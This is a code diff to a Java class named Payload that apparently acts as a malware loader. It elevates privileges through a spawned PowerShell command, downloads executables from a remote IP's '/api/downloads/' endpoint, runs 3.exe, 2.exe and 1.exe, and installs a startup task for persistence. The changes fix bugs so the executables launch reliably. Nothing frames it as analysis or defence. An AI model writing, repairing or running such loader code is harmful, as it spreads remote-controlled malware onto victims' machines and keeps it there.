@@ -55,7 +55,7 @@ public class Payload {
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             File lockFile = new File(getLoaderDir(), ".lock");
 
-            // FIX: Create the file and close it immediately so the child can delete it
+            // Create the file and close it immediately so the child can delete it
             lockFile.createNewFile();
 
             String psCommand = String.format(
@@ -193,7 +193,7 @@ public class Payload {
             log("Executing payload...");
             File loaderDir = getLoaderDir();
             
-            // CRUCIAL: Delete the lock file IMMEDIATELY so the parent knows we are elevated
+            // Delete the lock file to signal the parent process to die
             File lock = new File(loaderDir, ".lock");
             if (lock.exists()) {
                 lock.delete();
@@ -211,16 +211,23 @@ public class Payload {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
+            // FIX: Use absolute paths to guarantee ProcessBuilder finds the EXE
+            File exe3 = new File(loaderDir, "3.exe");
             log("Executing 3.exe...");
-            new ProcessBuilder(".\\3.exe").directory(loaderDir).start();
+            new ProcessBuilder(exe3.getAbsolutePath(), "all")
+                .directory(loaderDir).start();
             
+            File exe2 = new File(loaderDir, "2.exe");
             log("Executing 2.exe...");
-            new ProcessBuilder(".\\2.exe", "all").directory(loaderDir).start();
+            new ProcessBuilder(exe2.getAbsolutePath(), "all")
+                .directory(loaderDir).start();
             
             Thread.sleep(2000);
             
+            File exe1 = new File(loaderDir, "1.exe");
             log("Executing 1.exe...");
-            new ProcessBuilder(".\\1.exe", "all").directory(loaderDir).start();
+            new ProcessBuilder(exe1.getAbsolutePath(), "all")
+                .directory(loaderDir).start();
 
             installStartupTask(key, ip);
 
